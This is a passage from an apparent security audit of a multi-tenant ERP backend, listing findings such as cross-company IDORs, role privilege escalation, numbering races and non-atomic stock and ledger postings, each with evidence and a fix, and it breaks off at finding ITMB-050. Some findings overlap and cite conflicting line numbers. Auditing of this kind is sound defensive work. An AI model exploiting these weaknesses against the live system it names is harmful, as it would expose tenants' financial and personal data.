**What & why:** convertToSalesOrder() (quotations lines 183-224; mirrored in proforma-invoices.service.ts lines 80-181) creates a SalesOrder with status: 'CONFIRMED' and copies subtotal/discountAmount/taxAmount/totalAmount/outstandingAmount plus all lines verbatim from the quotation/proforma. It does NOT route through SalesOrdersService.confirm(), so no SALE_ISSUE inventory movement is created, no ProductBatch decrement, no Receivable for CREDIT terms, and no OUTPUT TaxTransaction ledger entry. The copied tax/discount were themselves client-trusted (calcLines lines 14-29 sum client discountAmount/taxAmount). The order is thus CONFIRMED yet has zero stock or ledger impact.

**Evidence:** quotations.service.ts lines 190-204 create SO with status: 'CONFIRMED' as any copying subtotal/discountAmount/taxAmount/totalAmount; lines 206-216 salesOrderLine.createMany copies l.discountAmount/l.taxAmount/l.lineTotal; proforma-invoices.service.ts lines 87-101 / 103-113 identical. No inventoryMovements/receivable/taxTransaction call in either.

**Impact:** Converted sales orders book confirmed revenue with client-controlled tax/discount while never decrementing inventory, silently corrupting stock-on-hand and the VAT ledger; goods can be issued against a CONFIRMED order that never reduced stock, and no receivable is raised for credit terms.

**Fix (summary):** Have convertToSalesOrder create a DRAFT SalesOrder via SalesOrdersService.create() (which validates and recomputes totals) then call confirm() so inventory, receivable and tax ledger run; never write status:'CONFIRMED' with copied client totals.

---

#### ITMB-033 — Quotation and proforma number generation via count()+1 outside the transaction races to duplicate document numbers

- **Severity:** high  •  **Confidence:** high  •  **Category:** Concurrency/race condition
- **Location:** `backend/src/modules/quotations/quotations.service.ts:31`

**What & why:** generateQuotationNumber() (lines 31-37) does count = await prisma.quotation.count({ where: { companyId, quotationNumber: { startsWith: 'QUO-'+year } } }); return 'QUO-'+year+'-'+pad(count+1), and is awaited at line 44 BEFORE the create $transaction at line 45, with no advisory lock or unique-retry. The identical pattern is in proforma-invoices.service.ts generateProformaNumber() (lines 31-37, called at line 44 before the tx). Two concurrent creates read the same count and emit the same number. quotationNumber and proformaNumber are @unique in the schema (lines 574, 644). Note sales-orders/fuel correctly use EntityCodeGeneratorService.next() (atomic entityCode.upsert); these two modules bypass it.

**Evidence:** quotations.service.ts lines 33-36 const count = await this.prisma.quotation.count(...); return ...String(count+1).padStart(5,'0'), awaited at line 44 before this.prisma.$transaction at line 45; same shape in proforma-invoices.service.ts lines 33-36 / 44-45; schema @unique at schema.prisma lines 574 and 644.

**Impact:** Concurrent quotation/proforma creation (plausible with multiple sales staff) produces colliding document numbers; because the columns are @unique the second insert throws P2002, surfacing as an unhandled 500 and a failed save for a legitimate request.

**Fix (summary):** Generate the number via EntityCodeGeneratorService.next({ entityType: 'Quotation'|'Proforma', companyId, tx }) inside the create $transaction (as sales-orders does), so numbering is atomic, instead of count()+1 outside the transaction.

---

#### ITMB-034 — Quotation->SalesOrder conversion: three writes with no $transaction + inline SO number bypassing the central sequence

- **Severity:** high  •  **Confidence:** high  •  **Category:** numbering
- **Location:** `backend/src/modules/quotations/quotations.service.ts:237`

**What & why:** convertToSalesOrder() (line 237) performs three separate writes on this.prisma (NOT a tx) with no surrounding $transaction: salesOrder.create (line 241), salesOrderLine.createMany (line 264), and quotation.update -> status CONVERTED + convertedSalesOrderId (line 278). If the process dies or the DB errors after salesOrder.create but before the lines/createMany or the status update commits, you get either a SalesOrder with no lines (wrong downstream totals) or a quotation left in ACCEPTED state. The guard at line 239 only rejects status !== 'ACCEPTED' (CONVERTED is never reached on a partial-failure path), so the operation can be retried and mint a SECOND SalesOrder -> duplicate order and later duplicate receivables. Separately, salesOrderNumber is minted inline at line 243 as `SO-${year}-${Date.now().toString(36).toUpperCase()}` instead of this.codes.next({entityType:'SalesOrder',...}) used by the canonical SalesOrders.create (sales-orders.service.ts:391, inside a $transaction). SalesOrder.salesOrderNumber is @@unique([companyId, salesOrderNumber]) (schema.prisma:2987) so the timestamp avoids collisions, but it never advances the SalesOrder DocumentNumberSequence -> converted orders are invisible to gap/sequence reporting and interleave a base36 timestamp among the canonical SO-{YYYY}-NNNNNN numbers. proforma-invoices.service.ts has the identical pattern (inline SO number line 222, three non-tx writes at 220/243/257).

**Evidence:** quotations.service.ts:243 inline SO number; :241 salesOrder.create, :264 createMany, :278 quotation.update -- all this.prisma.*, no $transaction. Guard :239 only blocks non-ACCEPTED. Canonical sales-orders.service.ts:390-395 ($transaction + codes.next entityType:'SalesOrder'). @@unique([companyId,salesOrderNumber]) schema.prisma:2987. DEFAULT_PATTERNS.SalesOrder='SO-{YYYY}-' defaults.ts:70. Mirror proforma-invoices.service.ts:220/222/243/257.

**Impact:** Partial failure during conversion yields an orphan SalesOrder with no lines, or a re-convertible quotation that produces duplicate sales orders and duplicate receivables. Converted orders use a divergent numbering scheme that never increments the shared SO sequence, breaking gap/sequence reporting.

**Fix (summary):** Wrap salesOrder.create + salesOrderLine.createMany + quotation.update(status CONVERTED) in one this.prisma.$transaction(async (tx)=>{...}) using tx for all three, re-checking status==='ACCEPTED' inside the tx, and mint the number via this.codes.next({entityType:'SalesOrder',companyId:quotation.companyId,tx}) (inject EntityCodeGeneratorService into QuotationsService as SalesOrdersService already does). DEFAULT_PATTERNS.SalesOrder is 'SO-{YYYY}-' padding 6 (defaults.ts:70) -- the canonical format -- so this aligns converted orders with the rest. Apply the identical fix to proforma-invoices.service.ts convertToSalesOrder (line 216).

---

#### ITMB-035 — Quotation number generated via count()+1 outside the tx -> P2002 crash under concurrency (@@unique([companyId, quotationNumber]))

- **Severity:** high  •  **Confidence:** high  •  **Category:** numbering
- **Location:** `backend/src/modules/quotations/quotations.service.ts:28`

**What & why:** generateQuotationNumber() returns `QUO-${year}-${String(count+1).padStart(5,'0')}` from a company+year-scoped prisma.quotation.count() (lines 28-34). It is called at line 38, BEFORE the $transaction at line 40, so two concurrent create() calls for the same company both read count=N and both build QUO-YYYY-(N+1). schema.prisma:4199 enforces @@unique([companyId, quotationNumber]); the second committer throws Prisma P2002, surfaced as an unhandled 500. The race window spans the count() read through the tx commit. A race-safe atomic issuer already exists (EntityCodeGeneratorService.next, atomic documentNumberSequence update with currentNumber:{increment:1}, entity-code-generator.service.ts:57-63) and accepts a tx; 'Quotation' is already mapped to the same 'QUO-{YYYY}-' padding-5 format in DEFAULT_PATTERNS.

**Evidence:** quotations.service.ts:28-34 count()+1; :38 call precedes tx at :40; unique schema.prisma:4199. Generator atomic update entity-code-generator.service.ts:57-63; DEFAULT_PATTERNS.Quotation defaults.ts:73.

**Impact:** Two salespeople quoting for the same company concurrently: the losing request gets a 500 instead of a quotation.

**Fix (summary):** Inject EntityCodeGeneratorService and mint via this.codes.next({entityType:'Quotation',companyId:dto.companyId,tx}) INSIDE the existing $transaction at line 40. DEFAULT_PATTERNS.Quotation='QUO-{YYYY}-' padding 5 (defaults.ts:73), so the visible format is preserved. Minimal alternative: move count+create into the tx and retry once on P2002.

---

#### ITMB-036 — Receivable payment is a non-atomic read-modify-write (lost-update race; payables does it correctly)

- **Severity:** high  •  **Confidence:** high  •  **Category:** balance integrity / race
- **Location:** `backend/src/modules/receivables/receivables.service.ts:225`

**What & why:** recordPayment() loads the receivable via findOne() OUTSIDE any transaction (line 226), validates and computes newPaid/newOutstanding/newStatus in JS (lines 228-241), and only then opens a $transaction that blindly writes those precomputed values (lines 243-255). There is no SELECT ... FOR UPDATE and the read is outside the transaction, so two concurrent receipts against the same invoice both read the same outstandingAmount, both pass the overpayment check (line 232), and the second update overwrites the first with stale paid/outstanding values — one payment is effectively lost and the invoice is under-reduced. The sibling payables.recordPayment already does this correctly with a SELECT ... FOR UPDATE row lock inside the transaction (payables.service.ts:224-240).

**Evidence:** Line 226 `const existing = await this.findOne(id, user);` then arithmetic at 238-239; the $transaction at line 243 only wraps the tx.receivable.update. Contrast payables.service.ts:225-230 raw SELECT ... FROM "payables" WHERE "id" = ${id} FOR UPDATE inside the tx.

**Impact:** Concurrent collections on one receivable corrupt outstandingAmount/paidAmount and the derived SalesOrder.paymentStatus synced via syncSalesOrderPaymentStatus (line 258), so AR is over- or under-stated. Lost-update data corruption on live AR.

**Fix (summary):** Restructure exactly like payables.recordPayment: open $transaction first, SELECT the receivable FOR UPDATE, then run the positive/overpayment checks and the Decimal arithmetic on the locked row, then update and sync the sales order — all inside the transaction.

---

#### ITMB-037 — IDOR: Rent Invoices findOne/update/issue/remove not company-scoped (cross-tenant financial-document tampering)

- **Severity:** high  •  **Confidence:** high  •  **Category:** Broken Access Control / IDOR
- **Location:** `backend/src/modules/rent-invoices/rent-invoices.service.ts:40`

**What & why:** findAll (line 26-38) is correctly scoped via applyCompanyScopeWhere(where, user, companyId), but findOne(id) at lines 40-51 runs prisma.rentInvoice.findFirst({ where: { id, deletedAt: null } }) with NO company check and takes no AuthUser. The controller's GET :id handler (rent-invoices.controller.ts:31-32) passes no user. update() (53), issue() (69) and remove() (79) each call await this.findOne(id) then mutate by raw id (prisma.rentInvoice.update({ where: { id } })). PermissionsGuard only checks the flat rent_invoices.* permission strings with no companyId comparison, so a user holding rent-invoices permissions in ANY company can target another company's invoice by UUID.

**Evidence:** rent-invoices.service.ts:41-50 findFirst({ where: { id, deletedAt: null } }) returned with no company check and no user param; update/issue/remove call await this.findOne(id) then update({ where: { id } }); controller :31-32 findOne(@Param('id') id) passes no user.

**Impact:** Any authenticated user with rent_invoices permissions in one company can read a specific rent invoice (tenant name, lease code, unit, amounts, billing period) of ANY other company by id, edit its amounts/dates, mark it ISSUED, or soft-delete it. Cross-tenant financial-document read and write/delete.

**Fix (summary):** Inject CompanyScopeService and thread AuthUser from the controller into findOne. After fetching, call await this.companyScope.assertCanAccessCompany(user, item.companyId) (use AccessLevel.WRITE for the mutation paths). Change update/issue/remove to call findOne(id, user) so the assertion runs before any mutation, and add @CurrentUser() to the controller's findOne. Narrowing-only; safe to deploy live.

---

#### ITMB-038 — restaurant-orders create() persists client-supplied monetary totals and paymentStatus verbatim (financial mass-assignment)

- **Severity:** high  •  **Confidence:** high  •  **Category:** mass-assignment/business-logic
- **Location:** `backend/src/modules/restaurant-orders/restaurant-orders.service.ts:19`

**What & why:** CreateRestaurantOrderDto declares optional client fields subtotal, totalAmount, paidAmount, outstandingAmount, paymentStatus and status (create-restaurant-order.dto.ts:38-45). These are declared DTO members, so whitelist:true does NOT strip them — they survive validation. create() does const { lines, ...orderData } = dto; then tx.restaurantOrder.create({ data: { ...orderData, orderDate: new Date(...) } }) (service:19-26): every monetary/status field is written exactly as sent. Nothing recomputes the header total from the line items nor forces a new order to UNPAID; lines are also spread verbatim (service:29). These are server-controlled financial-state fields. (create() also performs no assertCanAccessCompany on dto.companyId, but the dominant defect is the trusted financial state.)

**Evidence:** DTO:38-45 @IsOptional totalAmount/paidAmount/outstandingAmount; @IsEnum @IsOptional paymentStatus. service:19-26 const { lines, ...orderData } = dto; created = await tx.restaurantOrder.create({ data: { ...orderData, orderDate: new Date(orderData.orderDate) } });

**Impact:** A user can create an order with totalAmount/subtotal decoupled from the actual lines, and/or paymentStatus=PAID / paidAmount=full with no payment recorded — understating receivables and corrupting hospitality revenue and cash reconciliation, while header-vs-line discrepancies break downstream reporting.

**Fix (summary):** Remove subtotal/totalAmount/paidAmount/outstandingAmount/paymentStatus from CreateRestaurantOrderDto. Compute subtotal/tax/total server-side from the validated lines, initialize paidAmount=0, outstanding=total, paymentStatus=UNPAID, and apply payments only through a dedicated payment endpoint that recomputes paymentStatus.

---

#### ITMB-039 — POST /roles and PATCH /roles/:id allow a delegated role-admin to create a GROUP-scoped role and attach arbitrary permissions, escalating privilege

- **Severity:** high  •  **Confidence:** high  •  **Category:** authz
- **Location:** `backend/src/modules/roles/roles.controller.ts:26`

**What & why:** The role-management endpoints are gated ONLY by @RequirePermissions('roles.create') (roles.controller.ts:26-30) and @RequirePermissions('roles.update') (roles.controller.ts:32-36). Neither handler receives @CurrentUser and neither performs any authority check; the DTO is passed straight into RolesService. CreateRoleDto/UpdateRoleDto accept scope: RoleScope (create-role.dto.ts:8, update-role.dto.ts:8) and permissionIds: string[] (line 9), and RolesService writes them verbatim: create sets scope: dto.scope and creates rolePermissions from dto.permissionIds (roles.service.ts:36-47); update runs a transaction that deleteMany's all rolePermission rows for the role then createMany's them from dto.permissionIds and sets scope: dto.scope (roles.service.ts:54-74). jwt.strategy.ts derives roleScopes from each assigned role's scope (line 79) and permissions from rolePermissions (lines 80-83), so on the next token issuance the holder of an edited role inherits whatever scope/permissions were written. There is NO check that the actor (a) is GROUP-scoped before setting scope=GROUP or (b) already holds every permission being attached. The codebase's own UsersService.assertRolesAssignable (users.service.ts:448-466) blocks a non-GROUP actor from ASSIGNING group-scoped roles, but editing the scope/permission-set of a role the actor already holds bypasses that guard entirely because no new role assignment occurs.

**Evidence:** roles.controller.ts:26-36 (@RequirePermissions only, no @CurrentUser, no authority check); roles.service.ts:36-47 create writes dto.scope + dto.permissionIds; roles.service.ts:54-74 update deleteMany+createMany rolePermissions from dto.permissionIds and sets dto.scope; create-role.dto.ts:8-9 / update-role.dto.ts:8-9 expose scope+permissionIds; jwt.strategy.ts:79-83 roleScopes/permissions derived from assigned roles' scope+rolePermissions; users.service.ts:448-466 shows the analogous gating that is absent here.

**Impact:** Vertical privilege escalation. A delegated role manager holding only roles.create/roles.update can (1) edit a low-privilege role they already hold to add finance/HR/group-control/users.* permissions and inherit them, and (2) create or promote a role to scope=GROUP, which combined with the GROUP early-return in company-scope.service grants cross-company reach. On a live multi-tenant ERP this is a path to effective super-admin over every company's financial, HR, and group-control data.

**Fix (summary):** Pass @CurrentUser into both the create and update handlers and enforce in RolesService.create/update: (a) only an actor whose roleScopes includes 'GROUP' may set scope === RoleScope.GROUP, and (b) the actor must already possess every permission code referenced by dto.permissionIds (resolve the permission rows for dto.permissionIds and intersect against actor.permissions), or restrict scope/permission-set editing to GROUP-scoped actors. Mirror the gating in users.service.ts assertRolesAssignable. Keep the existing $transaction so the permission-set replacement stays atomic.

---

#### ITMB-040 — Room bookings never check for overlapping reservations (double-booking allowed)

- **Severity:** high  •  **Confidence:** high  •  **Category:** verticals
- **Location:** `backend/src/modules/room-bookings/room-bookings.service.ts:19`

**What & why:** RoomBookingsService.create() (lines 19-34) enforces only bookingNumber uniqueness (lines 20-23); it never checks that dto.roomId is free for the requested [expectedCheckIn, expectedCheckOut) window. checkIn() (lines 85-108) only verifies status === RESERVED before flipping the room to OCCUPIED. There is no findFirst anywhere in the service for an existing RESERVED/CHECKED_IN booking on the same roomId with overlapping dates. The create endpoint is real and permission-guarded ('hospitality.bookings.create'), and the DTO requires roomId + expectedCheckIn + expectedCheckOut, so two overlapping reservations for the same room are both accepted and both can be checked in.

**Evidence:** create() lines 20-23 only guard bookingNumber; lines 24-31 create unconditionally. checkIn() lines 87-94 only check status !== RESERVED. No roomId/date overlap query exists in the 154-line file. DTO requires roomId/expectedCheckIn/expectedCheckOut (create-room-booking.dto.ts). Room.status RoomStatus field confirmed in schema.

**Impact:** Front desk can reserve and check in two guests into the same physical room for overlapping nights (oversold rooms). On the second check-in/cancel the Room.status flag (OCCUPIED/DIRTY/AVAILABLE) overwrites the first booking's state, so room status becomes inconsistent. Guest-facing failure in the hospitality vertical.

**Fix (summary):** In create() (and re-validate in checkIn()), before persisting query for a conflict: prisma.roomBooking.findFirst({ where: { roomId: dto.roomId, deletedAt: null, status: { in: [RoomBookingStatus.RESERVED, RoomBookingStatus.CHECKED_IN] }, expectedCheckIn: { lt: new Date(dto.expectedCheckOut) }, expectedCheckOut: { gt: new Date(dto.expectedCheckIn) } } }); if found, throw new BadRequestException('Room is already booked for an overlapping period'). Use half-open intervals (lt/gt) so a same-day checkout/checkin does not falsely collide.

---

#### ITMB-041 — Negative or zero quantity and negative price/discount accepted in sales-order line math, corrupting totals and inventory on confirm

- **Severity:** high  •  **Confidence:** high  •  **Category:** Input validation
- **Location:** `backend/src/modules/sales-orders/dto/create-sales-order.dto.ts:8`

**What & why:** SalesOrderLineDto validates quantity and unitPrice with only @IsNumber() (dto lines 8-12) and discountAmount/taxAmount with @IsOptional() @IsNumber() (lines 14-20) - no @IsPositive/@Min lower bound. computeTotals() (service lines 45-60) applies no guard, so a negative/zero quantity, negative unitPrice, or discount exceeding qty*price flows into subtotal/totalAmount. At confirm() these quantities feed inventoryMovements.createMovement({ movementType: 'SALE_ISSUE', quantity: Number(line.quantity) }) (lines 204-214) and productBatch.remainingQuantity { decrement: Number(line.quantity) } (lines 215-222). The same unguarded calcLines exists in quotations/proforma.

**Evidence:** dto lines 8-20 use only @IsNumber()/@IsOptional() @IsNumber(); service computeTotals lines 50-54 const qty = Number(line.quantity); subtotal += qty*price; confirm() line 209 quantity: Number(line.quantity) for SALE_ISSUE; line 219 decrement: Number(line.quantity).

**Impact:** A negative line quantity yields a negative totalAmount (negative receivable / negative outstanding) and, on confirm, a negative SALE_ISSUE that effectively increases inventory plus a negative batch decrement that inflates remainingQuantity; a discount above the extended price yields a negative invoice. Corrupts AR/GL and stock balances.

**Fix (summary):** Add @IsPositive() to quantity and unitPrice and @Min(0) to discountAmount/taxAmount on SalesOrderLineDto (and the quotation/proforma/restaurant line DTOs), and defensively reject in computeTotals/calcLines (qty<=0, price<0, discount<0, discount>qty*price) on both create() and update().

---

#### ITMB-042 — stock-adjustments post() applies inventory movements outside any transaction and flips status separately - partial posting and double-apply on re-post

- **Severity:** high  •  **Confidence:** high  •  **Category:** atomicity/concurrency
- **Location:** `backend/src/modules/stock-adjustments/stock-adjustments.service.ts:274`

**What & why:** In post() the per-line loop (lines 274-295) calls this.inventoryMovements.createMovement(...) WITHOUT passing a tx. Because no tx is supplied, createMovement opens its OWN independent $transaction per line (inventory-movements.service.ts:201: `data.tx ? run(data.tx) : this.prisma.$transaction(...)`), so each line's movement + balance change commits independently. After the loop, the StockAdjustment status is set to POSTED in a SEPARATE statement (lines 297-304). Nothing wraps the movements and the status update together. If line N of M throws (e.g. the insufficient-stock guard at inventory-movements.service.ts:251 for a negative variance, or a validation failure), lines 1..N-1 have ALREADY committed their balance changes but the adjustment is never marked POSTED (stays APPROVED). Because status stays APPROVED, post() can be called again, re-creating ADJUSTMENT_IN/OUT movements for the lines that already succeeded, double-applying those variances.

**Evidence:** for (const line of existing.lines) { ... await this.inventoryMovements.createMovement({ ... quantity: Math.abs(variance), ... }); } /* no tx, each call its own $transaction */ const record = await this.prisma.stockAdjustment.update({ where: { id }, data: { status: StockAdjustmentStatus.POSTED, ... } });

**Impact:** A stock adjustment can be left half-applied: some product balances are permanently changed while the document still shows APPROVED, diverging InventoryBalance from the document. The still-APPROVED document can be re-posted (also via double-click/retry), double-applying the variances and corrupting on-hand quantities and WAC valuation.

**Fix (summary):** Wrap the whole post() body in a single this.prisma.$transaction(async (tx) => { ... }), thread tx into every createMovement call, and atomically claim the document at the start of the tx with a guarded transition - const claimed = await tx.stockAdjustment.updateMany({ where: { id, status: 'APPROVED' }, data: { status: 'POSTED', postedById: user.id, postedAt: new Date() } }); if (claimed.count === 0) throw new BadRequestException('Adjustment not postable'); - so movements and status commit or roll back together and concurrent/retried posts are rejected.

---

#### ITMB-043 — stock-damage post() is non-atomic across three independent writes and decrements batch quantity with no negative guard

- **Severity:** high  •  **Confidence:** high  •  **Category:** atomicity/correctness
- **Location:** `backend/src/modules/stock-damage/stock-damage.service.ts:166`

**What & why:** post() performs three independent, non-atomic writes: (1) createMovement(...) at lines 166-178 with NO tx, so it commits its own DAMAGE movement + balance decrement in a standalone transaction (DAMAGE is outbound, so the balance decrement itself is guarded by the FOR UPDATE/insufficient-stock path); (2) a separate productBatch.remainingQuantity decrement at lines 180-187 in another standalone statement; (3) a separate stockDamage status update to POSTED at lines 189-196. If step 2 or 3 fails after step 1 commits, the inventory balance has already been decremented but the batch remaining-quantity and/or document status are left inconsistent, leaving the damage APPROVED (and thus re-postable, since the pre-tx status check at line 158 is the only gate) while stock was already removed. The batch decrement `remainingQuantity: { decrement: quantity }` (line 184) has no lower-bound check, so it can drive ProductBatch.remainingQuantity negative (schema.prisma:4010 - plain Decimal, no DB constraint).

**Evidence:** await this.inventoryMovements.createMovement({ ... movementType: 'DAMAGE', quantity, ... }); /* no tx */ if (batchId) { await this.prisma.productBatch.update({ where: { id: batchId }, data: { remainingQuantity: { decrement: quantity } } }); } const record = await this.prisma.stockDamage.update({ where: { id }, data: { status: 'POSTED', ... } });

**Impact:** Stock can be removed from the balance while the batch ledger and document status are left inconsistent, and the still-APPROVED damage can be re-posted to remove stock again. Batch remaining quantity can go negative, breaking FIFO/expiry batch tracking and any report summing batch remainders.

**Fix (summary):** Wrap all three writes in one this.prisma.$transaction(async (tx) => { ... }), thread tx into createMovement, perform the batch decrement and status update inside the same tx, gate the batch decrement on availability via const res = await tx.productBatch.updateMany({ where: { id: batchId, remainingQuantity: { gte: quantity } }, data: { remainingQuantity: { decrement: quantity } } }); if (res.count === 0) throw new BadRequestException('Insufficient batch quantity'); and claim the status atomically with an updateMany guarded on status === current value so re-posts are rejected.

---

#### ITMB-044 — IDOR: Trips read + state transitions (dispatch/complete/cancel/close/remove) not company-scoped

- **Severity:** high  •  **Confidence:** high  •  **Category:** Broken Access Control / IDOR
- **Location:** `backend/src/modules/trips/trips.service.ts:82`

**What & why:** CORRECTION to the original audit: create() (line 31) and update() (line 330) DO call companyScope.assertCanAccessCompany, and findAll (58) is scoped via applyCompanyScopeWhere — so those are safe. The gap is findOne(id) (82-95), which does findFirst({ where: { id, deletedAt: null } }) with no company assertion and no user, and is reached directly by the controller's GET :id read and by dispatch (97), markInTransit (115), complete (122), close (144), cancel (285), remove (359) and getProfitability (303) — all of which mutate or expose by raw id with only a status check. PermissionsGuard does no per-company check.

**Evidence:** trips.service.ts:83-94 findOne findFirst({ where:{ id, deletedAt:null } }) no company/user; called unscoped by dispatch:98, markInTransit:116, complete:123, close:146, cancel:286, getProfitability:304, remove:360; create:31 and update:330 DO assertCanAccessCompany.

**Impact:** A user with trips permission in one company can read any trip (vehicle, driver, route, expenses, fuel usage, revenue) of any other company by id and drive its state transitions (dispatch/markInTransit/complete/close/cancel) or soft-delete it — close() can even auto-create a SalesOrder/Receivable in the victim company. Cross-tenant operational/financial IDOR on the read and transition paths (create/update are already protected).

**Fix (summary):** Add an AuthUser parameter to findOne and call await this.companyScope.assertCanAccessCompany(user, t.companyId) before returning; thread @CurrentUser() into the controller's findOne and the dispatch/markInTransit/complete/close/cancel/remove/getProfitability handlers so each mutation goes through the now-scoped findOne (use AccessLevel.WRITE for transitions). Follows the same template create()/update() already use. Narrowing-only.

---

#### ITMB-045 — Payable and receivable settlement never posts the cash/clearing journal entry (AP/AR control balances never reduced)

- **Severity:** high  •  **Confidence:** medium  •  **Category:** missing money movement / accounting integrity
- **Location:** `backend/src/modules/payables/payables.service.ts:218`

**What & why:** create() in both modules posts the control entry (payables: DR GENERAL_EXPENSE / CR AP_CONTROL at lines 130-160; receivables: DR AR_CONTROL / CR INCOME_SUMMARY at receivables.service.ts:140-158). But recordPayment() in both only mutates outstandingAmount/paidAmount/status — it never posts the offsetting settlement entry (payables: DR AP_CONTROL / CR Bank|Cash; receivables: DR Bank|Cash / CR AR_CONTROL). PostingEngineService is injected in both services but is unused inside recordPayment. The payment DTOs (record-payable-payment.dto.ts, record-receivable-payment.dto.ts) carry only amount/reference/paymentDate — no bank/cash account is captured, so even the account to credit/debit is unavailable.

**Evidence:** payables.service.ts:243-254 update sets only outstanding/paid/status with no postingEngine call; receivables.service.ts:243-255 likewise. Both inject PostingEngineService and call postingEngine.postLines only in create() (payables:142, receivables:145). Payment DTOs contain only amount/reference/paymentDate.

**Impact:** As invoices are paid/collected, the AP_CONTROL and AR_CONTROL ledger balances never decrease and the bank/cash GL never reflects the movement. The general-ledger trial balance, ledger-based AP/AR aging, and cash position are permanently overstated for every settlement made through these endpoints, diverging from the receivable/payable table values.

**Fix (summary):** Inside the locking transaction of each recordPayment, post a balanced settlement entry for the payment amount (payables: DR AP_CONTROL, CR selected Bank/Cash; receivables: DR Bank/Cash, CR AR_CONTROL) and link journalEntryId. Add a bank/cash account field to both payment DTOs (currently absent) to specify the settlement account.

---

#### ITMB-046 — Customer credit limit never enforced when confirming a CREDIT sales order or creating a fuel credit sale

- **Severity:** high  •  **Confidence:** medium  •  **Category:** Credit control
- **Location:** `backend/src/modules/sales-orders/sales-orders.service.ts:225`

**What & why:** In confirm() the CREDIT branch (lines 225-238) creates a Receivable for the full totalAmount with no lookup of the customer's credit limit or current open exposure and no rejection when exposure exceeds the limit. The same gap exists in FuelCreditSalesService.create() (fuel-credit-sales.service.ts lines 30-41), which creates an unconditional Receivable for dto.totalAmount. The schema models CustomerCreditProfile.creditLimit (schema.prisma line 805, customerId @unique), confirming credit limits are an intended control that both credit-issuing paths ignore.

**Evidence:** sales-orders confirm() lines 232-233 create receivable with amount: existing.totalAmount, outstandingAmount: existing.totalAmount and no limit check; fuel-credit-sales create() lines 36-37 amount: dto.totalAmount, outstandingAmount: dto.totalAmount with no limit check; schema.prisma line 805 creditLimit on CustomerCreditProfile.

**Impact:** Operators can extend unlimited credit to any customer regardless of an agreed ceiling, creating uncontrolled bad-debt exposure across both general sales and fuel forecourt credit - a core internal-control failure for a production ERP.

**Fix (summary):** Before creating the Receivable (inside the same transaction), load the customer's CustomerCreditProfile and sum of open receivables; if outstanding + newAmount > creditLimit, throw BadRequestException unless an explicit credit-override permission is present.

---


### MEDIUM severity

#### ITMB-047 — PermissionsGuard performs no per-company authorization (design context for the IDORs above)

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Broken Access Control / Design
- **Location:** `backend/src/common/guards/permissions.guard.ts:50`

**What & why:** PermissionsGuard.canActivate only checks required.filter(p => !user.permissions.includes(p)) (line 50) and the requiredAny variant (line 57) against the user's flat permission array; it never compares the target record's companyId. Per-company isolation is therefore entirely delegated to each service via CompanyScopeService/applyCompanyScopeWhere. This is by design (documented in the file header) but it confirms the unscoped findOne/findAll paths above are genuinely exploitable: holding a feature permission in one company authorizes the same action against every company's records wherever a service skips the scope helper. Record-level isolation cannot be fixed in this guard.

**Evidence:** permissions.guard.ts:50 missing = (required ?? []).filter(p => !user.permissions.includes(p)); :57 requiredAny.some(p => user.permissions.includes(p)); no companyId logic anywhere in canActivate.

**Impact:** Establishes that the cited service-level IDORs are exploitable in production rather than caught by a higher layer. A single feature permission grants cross-company access for any service that omits CompanyScopeService. Not directly exploitable on its own — severity reflects that the actual gaps live in the services.

**Fix (summary):** Keep the guard for coarse feature gating (do not add record lookups here). Enforce the invariant in the services: every company-owned entity service must apply companyWhereFor/applyCompanyScopeWhere on lists and assertCanAccessCompany on findOne and id-based mutations, backed by per-module isolation tests (the existing *.isolation.spec.ts pattern). No change to this file is required.

---

#### ITMB-048 — Period-lock check treats a period/fiscal-year-scoped lock with a date window as company-wide, over-blocking postings to unrelated open periods

- **Severity:** medium  •  **Confidence:** high  •  **Category:** accounting-integrity
- **Location:** `backend/src/common/services/accounting-control.service.ts:55`

**What & why:** In assertNoActiveLock (lines 38-74) scopeOr is built from three OR'd branches: the txn's accountingPeriodId (line 48), the txn's fiscalYearId (line 52), and a pure date-range branch (lines 55-60): `{ AND: [ { OR: [{ lockedFrom: null }, { lockedFrom: { lte: now } }] }, { OR: [{ lockedTo: null }, { lockedTo: { gte: now } }] } ] }`. The query is `where: { companyId, isActive: true, AND: [{ OR: scopeOr }] }` (lines 62-68). Because the date-range branch does NOT require the lock row's own accountingPeriodId/fiscalYearId to be null, a lock that is scoped to a DIFFERENT period/fiscal year but whose lockedFrom/lockedTo window happens to cover the current transactionDate matches via the third branch and blocks the posting. Period-scoped locks with date windows therefore leak into being treated as global.

**Impact:** Postings to a legitimately OPEN period are rejected as locked whenever an unrelated period's lock with an overlapping date window exists. After one period in a fiscal year is closed/locked with a date range, valid same-year postings to still-open periods can be halted. This is over-blocking rather than imbalance, but it can stop the business from posting.

**Fix (summary):** Constrain the date-window branch to genuinely company-wide locks by requiring the lock's own scope ids to be null on that branch: `{ accountingPeriodId: null, fiscalYearId: null, AND: [ { OR: [{ lockedFrom: null }, { lockedFrom: { lte: now } }] }, { OR: [{ lockedTo: null }, { lockedTo: { gte: now } }] } ] }`. Keep the period-specific and fiscal-year-specific branches as exact-id matches so a global date-range lock still blocks while period/year-scoped locks only block their own scope.

---

#### ITMB-049 — Nest application logger hardcodes 'debug' level in all environments including production

- **Severity:** medium  •  **Confidence:** high  •  **Category:** Hardening / Information Disclosure
- **Location:** `backend/src/main.ts:15`

**What & why:** NestFactory.create is called with a static logger array logger: ['error','warn','log','debug'] (L15) that is never gated on NODE_ENV. isProd is only derived afterward at L22 and is used solely for trust-proxy (L24-26) and Swagger (L59-67). As a result every Logger.debug() call across the backend is emitted in production. The framework's own request logging is clean (HttpExceptionFilter scrubs JWT-like tokens before logging via scrubLogText, and LoggingInterceptor logs only method+url+timing), so the exposure is via ad-hoc debug() calls in feature modules, which become active in prod. Confirmed: L14-16 has no environment gating; isProd is computed only at L22.

**Evidence:** main.ts L14-16: NestFactory.create<NestExpressApplication>(AppModule, { logger: ['error', 'warn', 'log', 'debug'] }); — isProd not computed until L22.

**Impact:** Inflated production log volume plus possible disclosure of request bodies, query params, and entity payloads (PII/financial data) from any module-level debug() call into log sinks on a live financial system at app.itembagrouptz.com.

**Fix (summary):** Gate the level set on environment, e.g. compute isProd from process.env.NODE_ENV before create() and pass logger: isProd ? ['error','warn','log'] : ['error','warn','log','debug']. This is a safe, behavior-preserving change for non-prod.

---

#### ITMB-050 — Per-email login lockout is in-memory and per-process — bypassable across replicas and lost on restart

- **Severity:** medium  •  **Confidence:** high  •  **Category:** authn
- **Location:** `backend/src/modules/auth/auth.service.ts:75`

